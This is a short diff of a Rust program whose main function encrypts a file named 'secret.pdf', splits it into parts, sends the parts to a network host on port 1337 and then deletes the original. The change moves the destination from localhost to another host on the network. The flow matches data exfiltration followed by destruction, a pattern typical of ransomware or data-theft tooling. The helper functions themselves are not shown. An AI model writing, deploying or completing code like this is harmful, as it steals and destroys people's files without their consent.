@@ -65,6 +65,6 @@ fn destroy_original(filepath: &str) {
 fn main() {
     let target = "secret.pdf";
     let parts = encrypt_file_and_split(target);
-    send_parts(&parts, "127.0.0.1", 1337);
+    send_parts(&parts, "192.168.129.92", 1337);
     destroy_original(target);
 }
